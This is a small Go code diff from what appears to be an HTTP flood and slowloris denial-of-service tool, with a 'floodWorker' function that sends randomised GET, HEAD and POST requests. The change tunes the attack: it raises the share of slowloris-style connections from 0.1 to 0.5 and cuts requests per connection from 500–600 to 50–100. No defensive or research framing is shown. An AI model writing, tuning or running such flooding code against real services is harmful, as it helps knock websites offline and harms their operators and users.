@@ -21,7 +21,7 @@ var (
 	timer         int
 	customHost    string
 	httpMethods   = []string{"GET", "HEAD", "POST"}
-	slowlorisRate = 0.1 // float64 type
+	slowlorisRate = 0.5 // float64 type
 )
 
 func init() {
@@ -169,7 +169,7 @@ func floodWorker(id int, stop <-chan struct{}) {
 				continue
 			}
 
-			for i := 0; i < rand.Intn(100)+500; i++ { // 500-600 requests/connection
+			for i := 0; i < rand.Intn(50)+50; i++ { // 50-100 requests/connection
 				method := httpMethods[rand.Intn(len(httpMethods))]
 				reqPath := path
 				if rand.Intn(2) == 0 {
